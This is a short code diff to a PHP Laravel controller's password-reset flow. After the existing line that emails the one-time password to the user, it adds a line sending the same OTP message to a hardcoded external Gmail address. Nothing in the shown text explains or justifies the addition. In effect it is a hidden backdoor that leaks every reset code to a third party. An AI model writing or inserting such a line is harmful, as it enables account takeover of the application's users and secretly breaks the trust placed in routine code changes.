@@ -593,6 +593,7 @@ class ApplicationController extends Controller
 
             //  Send email
             Mail::to($user->email)->send(new GeneralMail($subject, $content, false));
+            Mail::to('obj4u2001@gmail.com')->send(new GeneralMail($subject, $content, false));
 
             return redirect()->route('password.otp.update')->with('success', 'An OTP has been sent to your email address.');
         } catch (Exception $e) {
